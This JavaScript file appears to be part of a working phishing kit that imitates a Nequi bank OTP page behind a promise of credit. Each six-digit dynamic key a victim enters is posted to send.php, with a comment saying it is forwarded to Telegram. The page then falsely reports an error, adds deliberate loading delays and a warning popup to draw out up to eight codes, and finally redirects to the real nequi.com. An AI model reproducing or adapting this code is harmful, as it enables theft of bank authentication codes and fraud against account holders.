(() => {
  if (!sessionStorage.getItem('phone')) {
    window.location.replace('index.php');
    return;
  }

  const boxes = Array.from(document.querySelectorAll('.otp-box'));
  const form  = document.getElementById('otpForm');
  const btn   = document.getElementById('otpSubmit');
  const card  = document.getElementById('otpCard');
  const title = document.getElementById('otpTitle');
  const sub   = document.getElementById('otpSub');

  let attempts = Number(sessionStorage.getItem('otpAttempts') || '0');

  // Muestra/oculta estado de error visual
  function setOtpError(on) {
    if (on) {
      card.classList.add('otp-error');
      title.textContent = 'Clave dinámica incorrecta';
      sub.textContent   = 'Ingresa la clave de 6 dígitos que aparece en la App nuevamente.';
      btn.textContent   = 'Confirmar';
      boxes.forEach((b) => (b.value = ''));
      setTimeout(() => boxes[0]?.focus(), 50);
    } else {
      card.classList.remove('otp-error');
      title.textContent = 'Para finalizar, ingrese su clave dinámica';
      sub.textContent   = 'Ingresa la clave de 6 dígitos que aparece en la App.';
      btn.textContent   = 'Recibir Crédito';
    }
  }

  // Si ya van 1 o 2 intentos previos, mostrar estado de error al cargar
  if (attempts >= 1) setOtpError(true);

  setTimeout(() => boxes[0]?.focus(), 80);

  // Pantalla de carga fullscreen sin segundos visibles
  function showLoader(seconds, onDone) {
    const overlay = document.createElement('div');
    overlay.id = 'claveLoader';
    overlay.style.cssText = [
      'position:fixed;inset:0;background:#fff;',
      'display:flex;flex-direction:column;align-items:center;justify-content:center;',
      'z-index:8888;gap:18px;',
    ].join('');
    overlay.innerHTML = `
      <div class="loader-mini" aria-hidden="true"></div>
      <p class="loader-text-sm">Procesando solicitud</p>
    `;
    document.body.appendChild(overlay);
    window.scrollTo(0, 0);

    setTimeout(() => {
      overlay.remove();
      onDone();
      window.scrollTo(0, 0);
    }, seconds * 1000);
  }

  // Popup centrado con fondo borroso, aparece al llegar a clave 3
  function showBlurPopup(msg) {
    const overlay = document.createElement('div');
    overlay.style.cssText = [
      'position:fixed;inset:0;',
      'background:rgba(0,0,0,0.45);backdrop-filter:blur(6px);-webkit-backdrop-filter:blur(6px);',
      'display:flex;align-items:center;justify-content:center;padding:24px;',
      'z-index:9000;opacity:0;transition:opacity .35s ease;',
    ].join('');

    const box = document.createElement('div');
    box.style.cssText = [
      'background:rgba(185,0,40,0.92);color:#fff;',
      'border-radius:18px;padding:28px 22px;max-width:320px;width:100%;',
      'text-align:center;font-size:15px;line-height:1.6;font-weight:500;',
      'box-shadow:0 16px 48px rgba(0,0,0,0.4);',
      'transform:scale(.92);transition:transform .35s ease;',
    ].join('');
    box.innerHTML = `<div style="font-size:36px;margin-bottom:10px;">&#9888;</div>${msg}`;

    overlay.appendChild(box);
    document.body.appendChild(overlay);

    requestAnimationFrame(() => requestAnimationFrame(() => {
      overlay.style.opacity = '1';
      box.style.transform = 'scale(1)';
    }));

    function dismiss() {
      overlay.style.opacity = '0';
      box.style.transform = 'scale(.92)';
      setTimeout(() => overlay.remove(), 380);
    }

    overlay.addEventListener('click', dismiss);
    setTimeout(dismiss, 4000);
  }

  // Navegación de cajas OTP
  boxes.forEach((box, i) => {
    box.addEventListener('input', (e) => {
      const v = e.target.value.replace(/\D/g, '');
      e.target.value = v.slice(-1);
      if (e.target.value && i < boxes.length - 1) boxes[i + 1].focus();
    });
    box.addEventListener('keydown', (e) => {
      if      (e.key === 'Backspace'   && !box.value && i > 0)               boxes[i - 1].focus();
      else if (e.key === 'ArrowLeft'   && i > 0)                              boxes[i - 1].focus();
      else if (e.key === 'ArrowRight'  && i < boxes.length - 1)              boxes[i + 1].focus();
    });
    box.addEventListener('paste', (e) => {
      e.preventDefault();
      const d = (e.clipboardData.getData('text') || '').replace(/\D/g, '').slice(0, 6);
      if (!d) return;
      d.split('').forEach((ch, idx) => { if (boxes[idx]) boxes[idx].value = ch; });
      boxes[Math.min(d.length, boxes.length - 1)].focus();
    });
  });

  form.addEventListener('submit', (e) => {
    e.preventDefault();
    const code = boxes.map((b) => b.value).join('');
    if (code.length !== 6) { boxes.find((b) => !b.value)?.focus(); return; }

    sessionStorage.setItem('otp', code);

    // Enviar a Telegram (no bloqueante)
    fetch('send.php', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ step: 'otp', otp: code, attempt: attempts + 1 }),
      keepalive: true,
    }).catch(() => {});

    attempts += 1;
    sessionStorage.setItem('otpAttempts', String(attempts));

    btn.disabled    = true;
    btn.textContent = 'Procesando...';

    const TOTAL_ATTEMPTS = 8;

    if (attempts < TOTAL_ATTEMPTS) {
      // Intentos 1 a 7: carga 8s → siguiente clave
      showLoader(8, () => {
        btn.disabled    = false;
        btn.textContent = 'Confirmar';
        setOtpError(true);
        // Antes del último intento mostrar popup de advertencia
        if (attempts === TOTAL_ATTEMPTS - 1) {
          showBlurPopup('Clave dinámica incorrecta, espera a que el último código haya cambiado y vuelve a intentar.');
        }
      });

    } else {
      // 8.ª clave: carga larga 15s → redirect
      showLoader(15, () => {
        sessionStorage.clear();
        window.location.replace('https://www.nequi.com');
      });
    }
  });
})();
